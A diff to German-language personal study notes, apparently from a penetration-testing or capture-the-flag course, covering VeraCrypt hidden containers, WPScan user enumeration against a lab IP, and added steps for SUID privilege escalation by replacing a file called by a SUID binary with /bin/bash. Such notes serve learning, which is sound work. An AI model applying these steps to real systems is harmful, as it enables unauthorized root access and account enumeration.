@@ -13,6 +13,19 @@ Es benötigt zusätzlich die Key Length , Start
 VeraCrypt --> Laufwerk auswählen, Mount, Datei auswählen, Passwort wird benötigt 
 Das Passwort bestimmt ob ich in den inneren oder äußeren Container komme
 
+Priv Escalation via suid
+ls -l
+Berechtigungen falsch gesetzt und erschleiche mir über die Datei mit den schlechten rechten den root
+stat -c "%a %A %U %G %F" file
+greetings starke rechte, welcome schwache Rechte
+strings welcome
+Ist verlinkt zu Datei greetings mit starken Rechten
+cp /bin/bash greetings
+./welcome 
+
+
+
+
 WPScan
 wpscan -h
 wpscan --url http://10.10.14.187/ --enumerate u
